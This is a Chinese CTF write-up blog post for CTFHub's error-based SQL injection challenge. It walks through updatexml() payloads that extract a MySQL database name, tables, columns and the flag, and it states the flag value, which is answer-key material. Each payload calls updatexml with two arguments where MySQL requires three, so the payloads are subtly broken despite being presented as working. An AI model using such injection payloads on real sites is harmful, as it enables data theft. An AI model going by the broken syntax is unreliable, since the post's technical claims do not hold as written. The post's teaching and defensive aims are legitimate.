---
layout: post
title: "CTFHub SQL注入 - 报错注入"
date: 2026-10-12
categories: ctfhub
tags: [ctfhub,web,sql注入,报错注入,updatexml]
permalink: /ctfhub/sql-error-sqli.html
---

# CTFHub SQL注入 - 报错注入
## 一、题目信息
平台：CTFHub
分类：Web - SQL注入
题目名称：报错注入
难度：简单
Flag：`ctfhub{fc54c69abfb98d89b34ae228}`

## 二、考点
1. MySQL报错注入原理，利用`updatexml`函数报错带出数据
2. XPath语法错误触发数据库报错回显
3. MySQL元数据库`information_schema`查询库、表、字段

## 三、题目内容
页面存在ID输入框，输入ID进行查询。页面不会正常输出查询结果，但是**SQL执行出错时，会把错误信息直接打印在页面**。这种场景无法使用union联合查询，可使用报错注入，利用`updatexml`的XPath语法错误，将查询到的数据放进报错信息中回显。
后端SQL大致形式：`select * from news where id=用户输入`

## 四、解题步骤
1. **判断注入类型**
输入payload：`1'`，页面返回SQL语法报错，说明是**字符型注入**，需要单引号闭合。

2. **获取当前数据库名**
payload：`1' and updatexml(1,concat(0x7e,database(),0x7e))#`
`0x7e`是`~`，作为分隔符；`updatexml`第二个参数要求合法Xpath，构造非法语句触发报错，将database()结果带出。
得到数据库名：`sqli`

3. **查询该库下所有表名**
payload：`1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#`
查询得到表：`news,flag`，目标表为flag。

4. **查询flag表中的字段名**
payload：`1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x7e))#`
得到字段名称：`flag`。

5. **读取flag值**
payload：`1' and updatexml(1,concat(0x7e,(select flag from sqli.flag),0x7e))#`
页面报错信息里输出flag。
>注意：updatexml最多只能返回32个字符，如果flag较长，需要使用substr截取后半段：
`1' and updatexml(1,concat(0x7e,substr((select flag from sqli.flag),33),0x7e))#`

## 五、知识点解析
1. **报错注入**：页面无正常查询回显，但会输出数据库报错信息。人为构造错误函数，把想要查询的数据放到报错信息里，实现数据窃取。
2. **updatexml()**：MySQL用于更新XML内容的函数，第二个参数传入非法xpath语句，触发报错。`concat`拼接`~`方便定位数据。
3. **0x7e**：十六进制字符，对应`~`，用来分隔原有报错信息和我们查询的数据。
4. **group_concat()**：把多条记录合并为一行输出。
5. **substr()**：字符串截取函数，解决updatexml最多回显32字符的限制。

## 六、总结
报错注入适用场景：没有正常查询回显，但页面打印SQL错误信息。流程：判断注入点（单引号测试） → 爆库名 → 爆表名 → 爆字段 → 查询数据。防御方式：关闭生产环境SQL错误详情输出，使用预编译语句。
